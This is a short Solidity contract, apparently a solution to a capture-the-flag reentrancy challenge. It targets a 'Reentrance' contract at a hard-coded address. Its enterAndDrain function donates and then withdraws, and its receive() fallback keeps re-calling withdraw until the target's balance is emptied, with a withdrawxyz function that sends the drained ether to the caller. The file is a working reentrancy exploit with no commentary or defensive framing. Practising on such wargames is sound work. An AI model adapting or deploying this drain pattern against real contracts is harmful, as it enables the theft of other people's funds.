// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address) external returns (uint);
}

contract Enterrr {
    Reentrance public re = Reentrance(0x95B288e0Ab3E21C142dDd94CD97970C506247496);
    uint256 depositAmt;
    uint256 maxBal = address(re).balance;

    function enterAndDrain() payable public {
        depositAmt = address(this).balance-1;
        re.donate{value: depositAmt}(address(this));
        re.withdraw(depositAmt);
    }

    function withdrawxyz() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (maxBal > depositAmt){
            maxBal -= depositAmt;
            re.withdraw(depositAmt);
        }
        if (maxBal > 0){
            if (maxBal < depositAmt){
                re.withdraw(maxBal);
                maxBal = 0;
            }
        }
    }

}
